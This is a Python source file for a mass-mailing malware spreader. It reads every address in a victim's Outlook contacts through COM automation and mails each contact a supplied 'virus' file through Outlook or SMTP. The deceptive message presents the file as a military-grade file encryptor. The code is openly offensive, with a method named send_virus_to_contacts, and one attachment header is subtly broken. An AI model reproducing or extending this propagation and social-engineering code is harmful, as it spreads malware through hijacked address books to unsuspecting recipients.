import os
import smtplib
import win32com.client
import pythoncom
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

class OutlookMailer:
    def __init__(self):
        self.outlook = None
        self.setup_outlook()
    
    def setup_outlook(self):
        try:
            pythoncom.CoInitialize()
            self.outlook = win32com.client.Dispatch("Outlook.Application")
        except Exception as e:
            print(f"Error setting up Outlook: {e}")
    
    def get_contacts(self):
        try:
            namespace = self.outlook.GetNamespace("MAPI")
            contacts_folder = namespace.GetDefaultFolder(10)  # 10 is the contacts folder
            contacts = contacts_folder.Items
            
            email_addresses = []
            for contact in contacts:
                if hasattr(contact, "Email1Address") and contact.Email1Address:
                    email_addresses.append(contact.Email1Address)
            
            return email_addresses
        except Exception as e:
            print(f"Error getting contacts: {e}")
            return []
    
    def send_email_with_attachment(self, to_address, subject, body, attachment_path):
        try:
            mail = self.outlook.CreateItem(0)  # 0 is a mail item
            
            mail.To = to_address
            mail.Subject = subject
            mail.Body = body
            
            if attachment_path and os.path.exists(attachment_path):
                mail.Attachments.Add(attachment_path)
            
            mail.Send()
            return True
        except Exception as e:
            print(f"Error sending email: {e}")
            return False
    
    def send_virus_to_contacts(self, virus_path):
        contacts = self.get_contacts()
        
        subject = "Check out this amazing file encryptor!"
        body = """
Hi,

I found this awesome file encryption tool that protects your files with military-grade encryption.
It's really easy to use and keeps your documents safe from prying eyes.

Check it out!

Best regards,
"""
        
        success_count = 0
        for contact in contacts:
            if self.send_email_with_attachment(contact, subject, body, virus_path):
                success_count += 1
        
        return success_count

class SMTPMailer:
    def __init__(self, smtp_server, smtp_port, username, password):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.username = username
        self.password = password
    
    def send_email_with_attachment(self, to_address, subject, body, attachment_path):
        try:
            msg = MIMEMultipart()
            msg['From'] = self.username
            msg['To'] = to_address
            msg['Subject'] = subject
            
            msg.attach(MIMEText(body, 'plain'))
            
            if attachment_path and os.path.exists(attachment_path):
                with open(attachment_path, "rb") as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f"attachment; filename=os.path.basename(attachment_path)")
                    msg.attach(part)
            
            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
            server.starttls()
            server.login(self.username, self.password)
            server.send_message(msg)
            server.quit()
            
            return True
        except Exception as e:
            print(f"Error sending email: {e}")
            return False
